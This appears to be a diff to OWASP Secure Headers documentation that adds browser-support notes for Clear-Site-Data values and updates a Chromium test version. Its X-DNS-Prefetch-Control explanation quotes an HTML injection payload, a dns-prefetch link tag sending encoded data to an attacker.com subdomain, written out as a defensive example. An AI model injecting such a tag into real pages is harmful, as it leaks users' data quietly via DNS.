@@ -31,14 +31,17 @@ The following section proposes a configuration for the [actively supported and w
 
 🚩 Regarding the header `Content-Security-Policy`, keep in mind that the policy applicability depends on the execution context. Technical details are available [here](https://www.w3.org/TR/CSP2/#which-policy-applies). Therefore, CSP usage in a web API application implies to **define the CSP in the document consuming the content of the web API**.
 
-🚩 The header `Clear-Site-Data` will cause the browser to take additional processing time for the HTTP response, so, set it to the logout function when possible.
+🚩 The header `Clear-Site-Data` will cause the browser to take additional processing time for the HTTP response, so, set it to the logout function when possible. Additional information about the support for experimental values:
+
+* Experimental value `"executionContexts"` is not supported by Chromium version `140.0.7292.0`.
+* Experimental values `"executionContexts"`, `"prefetchCache"`, `"prerenderCache"` and `"clientHints"` are not supported by Firefox version `141.0.3`.
 
 🚩 The header `X-DNS-Prefetch-Control` seems currently only supported by [Chromium based browsers](https://github.com/OWASP/www-project-secure-headers/issues/201#issuecomment-3190756900) and more precisely Chrome for the `off` instruction. Therefore, as Chrome is highly used ([source](https://gs.statcounter.com/browser-market-share)), the proposal is to add the header on HTTP response which either:
 
 * Return sensitive or private content (commonly called [PII](https://en.wikipedia.org/wiki/Personal_data)).
 * Prone to HTML injection where an attacker can inject a tag `<link rel="dns-prefetch" href="//[exfiltrated data encoded].attacker.com">` to exfiltrate data quietly via DNS or be notified via DNS when the victim rendered the response in a browser.
 
-🔬 For the header `Permissions-Policy`, as it is currently only supported by [Chromium based browsers](https://caniuse.com/permissions-policy), the proposed value was generated with this [site](https://www.permissionspolicy.com/) and tested against the version `137.0.7124.0` of [Chromium](https://chromium.woolyss.com/download/en/) to only specify supported features.
+🔬 For the header `Permissions-Policy`, as it is currently only supported by [Chromium based browsers](https://caniuse.com/permissions-policy), the proposed value was generated with this [site](https://www.permissionspolicy.com/) and tested against the version `140.0.7292.0` of [Chromium](https://chromium.woolyss.com/download/en/) to only specify supported features.
 
 💡 Content of the table below is also provided, as JSON, via this [file](ci/headers_add.json) (automatically updated).
 
